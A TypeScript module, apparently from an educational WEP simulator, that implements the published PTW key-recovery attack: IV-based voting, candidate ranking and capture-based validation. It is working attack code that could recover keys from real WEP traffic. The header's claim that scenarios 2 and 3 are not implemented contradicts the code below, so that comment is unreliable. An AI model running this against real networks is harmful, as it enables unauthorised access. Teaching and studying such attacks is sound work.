/**
 * PTW key recovery — the real attack, from the paper.
 *
 * Erik Tews, Ralf-Philipp Weinmann and Andrei Pyshkin, "Breaking 104 bit WEP in
 * less than 60 seconds", 2007 [R3] (eprint.iacr.org/2007/120). Read 2026-10-06.
 * Section references below are to that paper.
 *
 * WHAT IS VOTED ON, and the label matters: not key bytes, but the SUMS
 *
 *     sigma_i  =  sum_{l=3}^{3+i} K[l]  =  sum_{l=0}^{i} Rk[l]   (mod 256)
 *
 * where K = IV || Rk is the per-packet key, so K[0..2] is the public IV and
 * Rk is the secret shared key. A vote table for sigma_4 is NOT a table of
 * guesses at Rk[4]; it is a table of guesses at the running total of the first
 * five secret bytes. The key is read back off the sums at the end:
 * Rk[0] = sigma_0 and Rk[i] = sigma_i - sigma_{i-1}. Section 6.
 *
 * THE ESTIMATOR is the paper's equation 5. Klein's attack gives an
 * approximation for a single key byte that depends on the permutation at that
 * step; PTW's contribution is to re-express it as a per-sum estimator that
 * depends only on the PUBLIC IV, so every sigma_i can be voted on
 * independently and in any order:
 *
 *     A_i  =  S_3^-1[ (3+i) - X[2+i] ]  -  ( j_3 + sum_{l=3}^{i+3} S_3[l] )   (mod 256)
 *
 * with (S_3, j_3) the RC4 key-schedule state after the three IV bytes and
 * X the recovered keystream (0-indexed). Each usable sample casts one vote for
 * sigma_i = A_i, for each i. Equation 4 is the same thing with the true
 * intermediate permutations; equation 5 substitutes S_3 for all of them, which
 * is what makes it computable from the IV alone and costs a little accuracy
 * (the paper's q_i, equations 7 and 8).
 *
 * Note the keystream indices: A_0 reads X[2] and A_12 reads X[14], so a sample
 * needs the first 15 keystream bytes. The ARP profile publishes 16.
 *
 * KEY RANKING is the paper's section 6.1, scenario 1 of section 7: start with
 * the top-voted value in every table, then repeatedly admit the next value with
 * minimum distance to its own table's leader and test the keys that become
 * constructible. A winning vote alone is NOT a verified key.
 *
 * DECLARED DEPARTURES FROM THE PAPER, so the success figures are not borrowed:
 *   - Scenarios 2 and 3 (strong-key-byte detection, section 6.2) are NOT
 *     implemented. For a strong key the relevant q_i collapses and that sum's
 *     correct value stops leading its table, so this implementation needs more
 *     samples than the paper on exactly those keys.
 *   - Only the 104-bit profile is wired for recovery in stage 1.
 *   - Validation is STRICTER than the paper's: it checks the known keystream
 *     prefix on reserved packets AND the genuine WEP ICV, rather than the
 *     paper's 6 keystream bytes on 10 random sessions.
 * The paper's "fewer than 40,000 packets in 50% of cases" is its own measured,
 * probabilistic result under its own conditions. It is not a guarantee and it is
 * not a claim about this implementation or about a browser.
 *
 * This module imports ONLY the pure RC4/CRC/WEP helpers. No generator, no
 * controller, no ground truth — see `contract.ts`.
 */

import { invert, ksaPartial } from '../../rc4/rc4';
import { concatBytes, equalBytes } from '../bytes';
import { WEP_ICV_LEN } from '../types';
import { keystreamPrefixFrom, keystreamUnder, parseBody, wepReceive } from '../wep';
import { rankStrongCandidates, strongByteValues } from './strong';
import {
  type AttackCounts,
  type AttackRequest,
  type AttackResult,
  type VoteTableSummary,
} from './contract';

/** Secret key bytes for each profile; sigma_0..sigma_{len-1} are voted on. */
const SECRET_BYTES: Record<40 | 104, number> = { 40: 5, 104: 13 };

/** A_i reads keystream byte X[2+i], so sigma_{n-1} needs X[n+1]. */
export function keystreamBytesNeeded(secretBytes: number): number {
  return secretBytes + 2;
}

/**
 * One sample's votes: A_i for i = 0..secretBytes-1, by equation 5.
 *
 * `iv` is public and `keystream` was derived by XORing captured ciphertext
 * against the profile's published prefix. Nothing secret enters.
 */
export function votesForSample(
  iv: Uint8Array,
  keystream: Uint8Array,
  secretBytes: number
): Uint8Array {
  // (S_3, j_3): the key schedule after the three PUBLIC IV bytes.
  const { s: s3, j: j3 } = ksaPartial(iv, 3);
  const s3inv = invert(s3);
  const out = new Uint8Array(secretBytes);
  let sSum = 0; // running sum_{l=3}^{i+3} S_3[l]
  for (let i = 0; i < secretBytes; i++) {
    sSum = (sSum + s3[3 + i]) & 0xff;
    const index = (3 + i - keystream[2 + i]) & 0xff;
    out[i] = (s3inv[index] - (j3 + sSum)) & 0xff;
  }
  return out;
}

/** The secret key read back off the sums: Rk[0] = s_0, Rk[i] = s_i - s_{i-1}. */
export function keyFromSigmas(sigmas: readonly number[]): Uint8Array {
  const key = new Uint8Array(sigmas.length);
  key[0] = sigmas[0] & 0xff;
  for (let i = 1; i < sigmas.length; i++) key[i] = (sigmas[i] - sigmas[i - 1]) & 0xff;
  return key;
}

/** And the inverse, used by the tests to vote-check a known key. */
export function sigmasFromKey(key: Uint8Array): number[] {
  const out: number[] = [];
  let running = 0;
  for (const b of key) {
    running = (running + b) & 0xff;
    out.push(running);
  }
  return out;
}

export interface UsableSample {
  readonly iv: Uint8Array;
  readonly keystream: Uint8Array;
}

export interface IntakeOutcome {
  readonly samples: UsableSample[];
  readonly supplied: number;
  readonly duplicateIvExcluded: number;
  readonly unusable: number;
}

/**
 * Parse captured bodies into usable samples.
 *
 * Each IV is counted ONCE for voting within the modelled single-key session: a
 * duplicate IV carries the same keystream, so counting it twice would inflate a
 * vote count without adding evidence, and the displayed "unique voting samples"
 * figure would be a lie. Excluded duplicates are counted separately.
 */
export function intake(
  bodies: readonly { readonly body: Uint8Array }[],
  knownPrefix: Uint8Array,
  payloadLength: number,
  keyId: number,
  secretBytes: number
): IntakeOutcome {
  const need = keystreamBytesNeeded(secretBytes);
  const samples: UsableSample[] = [];
  const seenIv = new Set<string>();
  let duplicateIvExcluded = 0;
  let unusable = 0;

  for (const captured of bodies) {
    let parsed;
    try {
      parsed = parseBody(captured.body);
    } catch {
      unusable++;
      continue;
    }
    // Named exclusion reasons, with consistent counters (brief section 11).
    if (parsed.keyId !== keyId || parsed.reservedBits !== 0) {
      unusable++;
      continue;
    }
    if (parsed.encrypted.length !== payloadLength + WEP_ICV_LEN) {
      unusable++;
      continue;
    }
    if (knownPrefix.length < need) {
      unusable++;
      continue;
    }
    let ivHex = '';
    for (const b of parsed.iv) ivHex += b.toString(16).padStart(2, '0');
    if (seenIv.has(ivHex)) {
      duplicateIvExcluded++;
      continue;
    }
    seenIv.add(ivHex);
    samples.push({
      iv: parsed.iv,
      keystream: keystreamPrefixFrom(parsed.encryptedPayload, knownPrefix),
    });
  }
  return { samples, supplied: bodies.length, duplicateIvExcluded, unusable };
}

/** A vote table for one sigma_i: 256 counters. */
export class VoteTable {
  readonly counts = new Uint32Array(256);
  total = 0;

  add(value: number): void {
    this.counts[value & 0xff]++;
    this.total++;
  }

  /** Values ordered by votes, best first. */
  ranked(): { value: number; votes: number }[] {
    const rows: { value: number; votes: number }[] = [];
    for (let v = 0; v < 256; v++) rows.push({ value: v, votes: this.counts[v] });
    rows.sort((a, b) => b.votes - a.votes || a.value - b.value);
    return rows;
  }

  summary(topN = 5): VoteTableSummary & { sigmaIndex: number } {
    return { sigmaIndex: -1, top: this.ranked().slice(0, topN), totalVotes: this.total };
  }
}

/** Cast every sample's votes into the tables. Section 6. */
export function tally(samples: readonly UsableSample[], secretBytes: number): VoteTable[] {
  const tables = Array.from({ length: secretBytes }, () => new VoteTable());
  for (const sample of samples) {
    const votes = votesForSample(sample.iv, sample.keystream, secretBytes);
    for (let i = 0; i < secretBytes; i++) tables[i].add(votes[i]);
  }
  return tables;
}

/**
 * The public validation rule — capture-based, no oracle.
 *
 * A candidate is checked against RESERVED distinct-IV packets that never
 * entered the vote, two ways on each:
 *   1. the keystream the candidate generates under that packet's public IV must
 *      reproduce the profile's known prefix when XORed into the ciphertext;
 *   2. the genuine WEP receiver must accept the packet's ICV under it.
 * Both use only captured evidence and the public profile. Nothing compares the
 * candidate with the hidden key — that happens outside the attacker entirely.
 */
export function validateCandidate(
  candidate: Uint8Array,
  reserved: readonly { readonly body: Uint8Array }[],
  knownPrefix: Uint8Array,
  need: number
): { readonly ok: boolean; readonly checked: number } {
  let checked = 0;
  for (const packet of reserved) {
    let parsed;
    try {
      parsed = parseBody(packet.body);
    } catch {
      continue;
    }
    checked++;
    const ks = keystreamUnder(parsed.iv, candidate, Math.min(need, knownPrefix.length));
    const derived = keystreamPrefixFrom(parsed.encryptedPayload, knownPrefix.subarray(0, ks.length));
    if (!equalBytes(ks, derived)) return { ok: false, checked };
    if (!wepReceive(packet.body, candidate).icvValid) return { ok: false, checked };
  }
  return { ok: checked > 0, checked };
}

export interface SearchHooks {
  /** Return false to stop the search (budget or cancellation). */
  readonly tick?: (candidatesTested: number) => boolean;
}

/**
 * The candidate search: section 6.1's key ranking, optionally combined with
 * section 6.2's strong-byte substitution.
 *
 * M_i starts as the single top-voted value in table i. While nothing has
 * validated and budget remains, admit the value (across all tables) with
 * MINIMUM DISTANCE to its own table's leader - distance being the vote deficit
 * - and test every key that has newly become constructible.
 *
 * `assumedStrong` names indices whose table is to be IGNORED, their value taken
 * from equation 12 instead. That equation needs Rk[0..i-1], so the enumeration
 * walks the sums left to right rather than as a flat product. Index 0 can never
 * be strong and is rejected.
 *
 * A winning vote is not a verified key: `validate` is the public,
 * capture-based rule, and even passing it only makes the result a VALIDATED
 * CANDIDATE.
 */
export function rankAndSearch(
  tables: readonly VoteTable[],
  validate: (candidate: Uint8Array) => boolean,
  maxCandidates: number,
  hooks: SearchHooks = {},
  assumedStrong: readonly number[] = []
): { candidate: Uint8Array | null; candidatesTested: number; stopped: boolean } {
  for (const i of assumedStrong) {
    if (i < 1 || i >= tables.length) {
      throw new Error(`index ${i} cannot be a strong key byte (equation 9 needs i >= 1)`);
    }
  }
  const strong = new Set(assumedStrong);
  const rankedPerTable = tables.map((t) => t.ranked());
  const admitted = rankedPerTable.map((rows) => [rows[0].value]);
  const depth = rankedPerTable.map(() => 1);
  const tested = new Set<string>();
  let candidatesTested = 0;
  let stopped = false;

  /**
   * Walk the sums left to right. At each index the candidate values are either
   * the admitted set from its table, or - for an assumed-strong index - the at
   * most i values equation 12 allows given the key bytes chosen so far.
   */
  const walk = (
    index: number,
    sigmas: number[],
    keyBytes: number[]
  ): Uint8Array | null => {
    if (stopped) return null;
    if (index === tables.length) {
      const key = Uint8Array.from(keyBytes);
      let id = '';
      for (const b of key) id += b.toString(16).padStart(2, '0');
      if (tested.has(id)) return null;
      tested.add(id);
      candidatesTested++;
      if (hooks.tick?.(candidatesTested) === false) {
        stopped = true;
        return null;
      }
      if (validate(key)) return key;
      if (candidatesTested >= maxCandidates) stopped = true;
      return null;
    }

    let values: number[];
    if (strong.has(index)) {
      // Equation 12 gives Rk[index]; sigma follows from the running sum.
      values = strongByteValues(keyBytes, index).map((rk) => (sigmas[index - 1] + rk) & 0xff);
    } else {
      values = admitted[index];
    }

    for (const sigma of values) {
      const rk = index === 0 ? sigma & 0xff : (sigma - sigmas[index - 1]) & 0xff;
      sigmas.push(sigma);
      keyBytes.push(rk);
      const hit = walk(index + 1, sigmas, keyBytes);
      sigmas.pop();
      keyBytes.pop();
      if (hit) return hit;
      if (stopped) return null;
    }
    return null;
  };

  const tryKeys = (): Uint8Array | null => walk(0, [], []);

  let found = tryKeys();
  while (!found && !stopped && candidatesTested < maxCandidates) {
    // Admit the next value with minimum distance to its own table's leader.
    // Tables an assumed-strong index owns are never expanded: their
    // distribution is the thing being distrusted.
    let bestTable = -1;
    let bestDistance = Infinity;
    for (let i = 0; i < tables.length; i++) {
      if (strong.has(i)) continue;
      const rows = rankedPerTable[i];
      if (depth[i] >= rows.length) continue;
      const distance = rows[0].votes - rows[depth[i]].votes;
      if (distance < bestDistance) {
        bestDistance = distance;
        bestTable = i;
      }
    }
    if (bestTable < 0) break;
    admitted[bestTable].push(rankedPerTable[bestTable][depth[bestTable]].value);
    depth[bestTable]++;
    found = tryKeys();
  }
  return { candidate: found, candidatesTested, stopped };
}

/**
 * The three scenarios of the paper's section 7, with its budget split.
 *
 * scenario 1 - 70% of the candidate limit, key ranking alone (section 6.1).
 * scenario 2 - 20%, assuming the single most-likely-strong byte is strong.
 * scenario 3 - 10%, assuming the two most likely are.
 *
 * "Most likely" is equations 10 and 11, computed from the vote counts alone
 * (see `strong.ts`); nothing here consults the key.
 */
export interface ScenarioOutcome {
  readonly candidate: Uint8Array | null;
  readonly candidatesTested: number;
  readonly stopped: boolean;
  /** Which scenario produced the candidate, when one did. */
  readonly scenario: number | null;
  /** The strong-byte indices each scenario assumed, for the report. */
  readonly assumedStrong: readonly number[];
}

export function searchAllScenarios(
  tables: readonly VoteTable[],
  validate: (candidate: Uint8Array) => boolean,
  maxCandidates: number,
  hooks: SearchHooks = {}
): ScenarioOutcome {
  const likelyStrong = rankStrongCandidates(tables).map((x) => x.sigmaIndex);
  const plans: { scenario: number; share: number; strong: number[] }[] = [
    { scenario: 1, share: 0.7, strong: [] },
    { scenario: 2, share: 0.2, strong: likelyStrong.slice(0, 1) },
    { scenario: 3, share: 0.1, strong: likelyStrong.slice(0, 2) },
  ];

  let totalTested = 0;
  let lastStopped = false;
  for (const plan of plans) {
    if (plan.strong.length && plan.strong.some((i) => i < 1)) continue;
    const share = Math.max(1, Math.floor(maxCandidates * plan.share));
    let cancelled = false;
    const r = rankAndSearch(
      tables,
      validate,
      share,
      {
        tick: (n): boolean => {
          const keep = hooks.tick ? hooks.tick(totalTested + n) : true;
          if (keep === false) cancelled = true;
          return keep;
        },
      },
      plan.strong
    );
    totalTested += r.candidatesTested;
    lastStopped = r.stopped;
    if (r.candidate) {
      return {
        candidate: r.candidate,
        candidatesTested: totalTested,
        stopped: false,
        scenario: plan.scenario,
        assumedStrong: plan.strong,
      };
    }
    // A learner-driven cancellation stops everything; an exhausted share moves
    // on to the next scenario, which is the point of the split.
    if (cancelled) {
      return {
        candidate: null,
        candidatesTested: totalTested,
        stopped: true,
        scenario: null,
        assumedStrong: plan.strong,
      };
    }
  }
  return {
    candidate: null,
    candidatesTested: totalTested,
    stopped: lastStopped,
    scenario: null,
    assumedStrong: [],
  };
}

export interface RunHooks {
  /** Called periodically; return false to cancel. */
  readonly shouldContinue?: () => boolean;
  readonly onProgress?: (processed: number, total: number, candidatesTested: number) => void;
}

/**
 * The whole bounded attack, from a capture-only request to a result.
 *
 * Every number in the result was produced by this run. Nothing is stored and
 * nothing is looked up.
 */
export function runPtw(request: AttackRequest, hooks: RunHooks = {}): AttackResult {
  const started = Date.now();
  const secretBytes = SECRET_BYTES[request.keyBits];
  const need = keystreamBytesNeeded(secretBytes);

  const emptyCounts = (over: Partial<AttackCounts> = {}): AttackCounts => ({
    supplied: 0,
    usable: 0,
    duplicateIvExcluded: 0,
    voting: 0,
    validationAvailable: request.validation.length,
    validationChecked: 0,
    candidatesTested: 0,
    ...over,
  });

  try {
    const capped = request.captured.slice(0, request.budget.maxPackets);
    const taken = intake(
      capped,
      request.profile.knownPrefix,
      request.profile.payloadLength,
      request.profile.keyId,
      secretBytes
    );

    if (taken.samples.length === 0) {
      return {
        runId: request.runId,
        state: 'no-usable-samples',
        candidate: null,
        counts: emptyCounts({
          supplied: capped.length,
          duplicateIvExcluded: taken.duplicateIvExcluded,
        }),
        elapsedMillis: Date.now() - started,
        voteTables: [],
      };
    }

    hooks.onProgress?.(0, taken.samples.length, 0);
    const tables = tally(taken.samples, secretBytes);
    hooks.onProgress?.(taken.samples.length, taken.samples.length, 0);

    if (hooks.shouldContinue?.() === false) {
      return {
        runId: request.runId,
        state: 'cancelled',
        candidate: null,
        counts: emptyCounts({
          supplied: capped.length,
          usable: taken.samples.length,
          duplicateIvExcluded: taken.duplicateIvExcluded,
          voting: taken.samples.length,
        }),
        elapsedMillis: Date.now() - started,
        voteTables: summarise(tables),
      };
    }

    let validationChecked = 0;
    const validate = (candidate: Uint8Array): boolean => {
      const v = validateCandidate(candidate, request.validation, request.profile.knownPrefix, need);
      validationChecked = Math.max(validationChecked, v.checked);
      return v.ok;
    };

    // Why the two flags are separate: a run that EXHAUSTED its budget and one
    // the learner CANCELLED are different outcomes with different wording, and
    // the time cap is a budget rather than a cancellation.
    let cancelledByLearner = false;
    let outOfTime = false;
    const search = searchAllScenarios(tables, validate, request.budget.maxCandidates, {
      tick: (n) => {
        if (hooks.shouldContinue?.() === false) {
          cancelledByLearner = true;
          return false;
        }
        if (Date.now() - started > request.budget.maxMillis) {
          outOfTime = true;
          return false;
        }
        if (n % 64 === 0) hooks.onProgress?.(taken.samples.length, taken.samples.length, n);
        return true;
      },
    });

    const counts = emptyCounts({
      supplied: capped.length,
      usable: taken.samples.length,
      duplicateIvExcluded: taken.duplicateIvExcluded,
      voting: taken.samples.length,
      validationChecked,
      candidatesTested: search.candidatesTested,
    });

    if (search.candidate) {
      // A VALIDATED CANDIDATE. Not yet a recovered key — the controller decides.
      return {
        runId: request.runId,
        state: 'recovered-candidate',
        candidate: search.candidate,
        counts,
        elapsedMillis: Date.now() - started,
        voteTables: summarise(tables),
        boundBy: null,
        scenario: search.scenario,
        assumedStrong: search.assumedStrong,
      };
    }

    return {
      runId: request.runId,
      state: cancelledByLearner ? 'cancelled' : 'no-key-within-budget',
      candidate: null,
      counts,
      elapsedMillis: Date.now() - started,
      voteTables: summarise(tables),
      boundBy: cancelledByLearner ? null : outOfTime ? 'time' : 'candidates',
      scenario: null,
      assumedStrong: [],
    };
  } catch (e) {
    return {
      runId: request.runId,
      state: 'experiment-error',
      candidate: null,
      counts: emptyCounts(),
      elapsedMillis: Date.now() - started,
      voteTables: [],
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

function summarise(tables: readonly VoteTable[]): VoteTableSummary[] {
  return tables.map((t, i) => ({ ...t.summary(), sigmaIndex: i }));
}

/** Convenience for the panel: the per-packet key under a candidate. */
export function candidatePerPacketKey(iv: Uint8Array, candidate: Uint8Array): Uint8Array {
  return concatBytes(iv, candidate);
}
